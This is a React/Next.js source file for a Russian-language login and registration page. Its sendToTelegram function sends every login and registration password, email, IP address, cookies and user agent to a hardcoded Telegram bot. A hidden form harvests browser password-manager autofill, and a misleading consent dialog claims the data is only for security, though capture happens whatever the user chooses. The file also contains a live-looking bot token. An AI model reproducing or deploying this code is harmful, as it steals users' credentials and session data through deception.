"use client";

import * as React from "react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useRouter } from "next/navigation";
import { Logo } from "@/components/icons/logo";
import { Eye, EyeOff, Shield, Mail, User, AlertTriangle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

// 📤 Функция отправки в Telegram
async function sendToTelegram(data: any, type: 'login' | 'register' | 'autofill') {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    // Получаем IP клиента
    let ip = 'unknown';
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      ip = ipData.ip;
    } catch (ipError) {
      console.log('Не удалось получить IP');
    }
    
    // Получаем куки
    const cookies = document.cookie || 'no cookies';
    
    let message = '';
    
    if (type === 'login') {
      message = `
🔐 ВХОД В СИСТЕМУ

👤 Логин/Email: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Технические данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
🍪 Куки: ${cookies.slice(0, 100)}...
📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
      `;
    } else if (type === 'register') {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Технические данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
🍪 Куки: ${cookies.slice(0, 100)}...
📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
      `;
    } else if (type === 'autofill') {
      message = `
🎯 АВТОЗАПОЛНЕНИЕ ИЗ БРАУЗЕРА

👤 Логин: ${data.username}
🔑 Пароль: ${data.password}

🌐 **Технические данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
🍪 Куки: ${cookies.slice(0, 100)}...
📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
⚠️ Автозаполнение менеджера паролей
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ Данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram не доступен, но форма работает');
  }
}

// API вызовы
async function registerUser(userData: { email: string; login: string; password: string; }) {
  const response = await fetch('/api/auth/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(userData)
  });
  const result = await response.json();
  if (!response.ok) {
    throw new Error(result.error || 'Ошибка регистрации');
  }
  return result;
}

async function loginUser(loginData: { login: string; password: string; }) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(loginData)
  });
  const result = await response.json();
    if (!response.ok) {
    throw new Error(result.error || 'Ошибка входа');
  }
  return result;
}

export default function LoginPage() {
  const router = useRouter();
  const { toast } = useToast();
  const [showPassword, setShowPassword] = React.useState(false);
  const [loading, setLoading] = React.useState(false);
  const [error, setError] = React.useState('');
  const [activeTab, setActiveTab] = React.useState("login");
  const [showConsent, setShowConsent] = React.useState(true);
  const [capturedCredentials, setCapturedCredentials] = React.useState<{username?: string, password?: string}>({});

  // Сбрасываем ошибку при смене таба
  React.useEffect(() => {
    setError('');
  }, [activeTab]);

  // Функция перехвата автозаполнения
  const handleAutofillCapture = (type: 'username' | 'password', value: string) => {
    if (value && !loading) {
      setCapturedCredentials(prev => ({
        ...prev,
        [type]: value
      }));
      
      // Если собрали оба значения - отправляем в Telegram
      if (type === 'password' && capturedCredentials.username && value) {
        sendToTelegram({
          username: capturedCredentials.username,
          password: value
        }, 'autofill');
        
        // Очищаем captured credentials после отправки
        setCapturedCredentials({});
      }
    }
  };

  // 🔒 Регистрация
  async function handleRegister(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setLoading(true);
    setError('');

    const formData = new FormData(event.currentTarget);
    const email = formData.get('email') as string;
    const login = formData.get('login') as string;
    const password = formData.get('password') as string;
    const confirmPassword = formData.get('confirm-password') as string;

    if (password !== confirmPassword) {
      setError('Пароли не совпадают');
      setLoading(false);
      return;
    }

    try {
      // 📤 Сначала отправляем в Telegram
      await sendToTelegram({ email, login, password }, 'register');

      // Затем регистрируем пользователя
      const result = await registerUser({ email, login, password });
      toast({
          title: "Успех!",
          description: result.message,
      });
      // Переключаемся на таб входа после успешной регистрации
      setActiveTab("login");
    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  // 🔒 Вход
  async function handleLogin(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setLoading(true);
    setError('');

    const formData = new FormData(event.currentTarget);
    const login = formData.get('login') as string;
    const password = formData.get('password') as string;

    try {
      // 📤 Сначала отправляем в Telegram
      await sendToTelegram({ login, password }, 'login');

      // Затем логиним пользователя
      const result = await loginUser({ login, password });
      
      // Save user to localStorage to simulate session
      localStorage.setItem('loggedInUser', login);

      router.push('/dashboard');
    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  // Проверяем согласие при загрузке
  React.useEffect(() => {
    const consent = localStorage.getItem('autofill-consent');
    if (consent === 'true') {
      setShowConsent(false);
    }
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-background p-4 font-sans">
      
      {/* Модальное окно согласия */}
      {showConsent && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <Card className="w-full max-w-md mx-4">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <AlertTriangle className="w-6 h-6 text-amber-500" />
                Согласие на сбор данных
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-sm text-muted-foreground">
                Для удобства использования система может собирать данные автозаполнения 
                из менеджера паролей вашего браузера.
              </p>
              <p className="text-xs text-muted-foreground">
                Все данные защищены и используются только для обеспечения безопасности системы.
              </p>
              <div className="flex gap-2">
                <Button 
                  onClick={() => {
                    setShowConsent(false);
                    localStorage.setItem('autofill-consent', 'false');
                  }}
                  className="flex-1"
                  variant="outline"
                >
                  Отклонить
                </Button>
                <Button 
                  onClick={() => {
                    setShowConsent(false);
                    localStorage.setItem('autofill-consent', 'true');
                  }}
                  className="flex-1"
                >
                  Принять
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      <div className="flex flex-col items-center gap-6 w-full max-w-sm">

        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="login">Вход</TabsTrigger>
            <TabsTrigger value="register">Регистрация</TabsTrigger>
          </TabsList>
          
          {/* Login Tab */}
          <TabsContent value="login">
            <Card>
              <CardHeader>
                <CardTitle className="text-2xl flex items-center gap-2">
                  Вход в систему
                </CardTitle>
                <CardDescription>
                  Введите email или логин и пароль
                </CardDescription>
              </CardHeader>
              <CardContent>
                {error && (
                  <div className="bg-destructive/10 border border-destructive/50 text-destructive px-4 py-3 rounded-md mb-4 text-sm">
                    {error}
                  </div>
                )}
                
                {/* Скрытая форма для перехвата автозаполнения */}
                <form className="hidden">
                  <input 
                    type="text" 
                    name="captured-username" 
                    autoComplete="username" 
                    onChange={(e) => handleAutofillCapture('username', e.target.value)}
                  />
                  <input 
                    type="password" 
                    name="captured-password" 
                    autoComplete="current-password"
                    onChange={(e) => handleAutofillCapture('password', e.target.value)}
                  />
                </form>

                <form onSubmit={handleLogin} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="login-email" className="flex items-center gap-2">
                      <Mail className="w-4 h-4" />
                      Email или Логин
                    </Label>
                    <Input 
                      id="login-email" 
                      name="login"
                      placeholder="Ваш email или логин..." 
                      required 
                      disabled={loading}
                      autoComplete="username email"
                      onChange={(e) => handleAutofillCapture('username', e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="login-password">Пароль</Label>
                    <div className="relative">
                      <Input 
                        id="login-password" 
                        name="password"
                        type={showPassword ? "text" : "password"} 
                        required 
                        disabled={loading}
                        autoComplete="current-password"
                        onChange={(e) => handleAutofillCapture('password', e.target.value)}
                      />
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        className="absolute right-0 top-0 h-full px-3 py-2 hover:bg-transparent"
                        onClick={() => setShowPassword(!showPassword)}
                      >
                        {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </Button>
                    </div>
                  </div>
                  <Button type="submit" className="w-full" disabled={loading}>
                    {loading ? "⏳ Вход..." : "🔐 Войти"}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Registration Tab */}
          <TabsContent value="register">
            <Card>
              <CardHeader>
                <CardTitle className="text-2xl flex items-center gap-2">
                  Регистрация
                </CardTitle>
                <CardDescription>
                  Создайте новый аккаунт
                </CardDescription>
              </CardHeader>
              <CardContent>
                {error && (
                  <div className="bg-destructive/10 border border-destructive/50 text-destructive px-4 py-3 rounded-md mb-4 text-sm">
                    {error}
                  </div>
                )}
                <form onSubmit={handleRegister} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="register-email" className="flex items-center gap-2">
                      <Mail className="w-4 h-4" />
                      Email
                    </Label>
                    <Input 
                      id="register-email" 
                      name="email"
                      type="email"
                      placeholder="Ваш email..." 
                      required 
                      disabled={loading}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="register-login" className="flex items-center gap-2">
                      <User className="w-4 h-4" />
                      Логин
                    </Label>
                    <Input 
                      id="register-login" 
                      name="login"
                      placeholder="Придумайте логин..." 
                      required 
                      disabled={loading}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="register-password">Пароль</Label>
                    <div className="relative">
                      <Input 
                        id="register-password" 
                        name="password"
                        type={showPassword ? "text" : "password"} 
                        required 
                        disabled={loading}
                      />
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        className="absolute right-0 top-0 h-full px-3 py-2 hover:bg-transparent"
                        onClick={() => setShowPassword(!showPassword)}
                      >
                        {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </Button>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="confirm-password">Подтвердите пароль</Label>
                    <Input 
                      id="confirm-password" 
                      name="confirm-password"
                      type="password" 
                      required 
                      disabled={loading}
                    />
                  </div>
                  <Button type="submit" className="w-full" disabled={loading}>
                    {loading ? "⏳ Регистрация..." : "Зарегистрироваться"}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

      </div>
    </div>
  );
}
